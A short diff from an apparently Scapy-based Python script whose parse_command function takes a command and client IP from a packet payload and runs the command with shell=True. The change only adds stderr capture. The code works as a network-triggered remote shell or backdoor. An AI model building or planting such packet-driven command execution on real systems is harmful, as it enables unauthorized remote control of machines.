@@ -16,7 +16,7 @@ def parse_command(packet):
     payload = packet['Raw'].load
     command = payload.split('#')[0]
     client_ip = payload.split('#')[1]
-    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     output = proc.stdout.read()
     print (output)
     # pkt = IP(dst=client_ip, src=packet["IP"].dst)/UDP(dport=int(args.client_port), sport=int(args.server_port)))
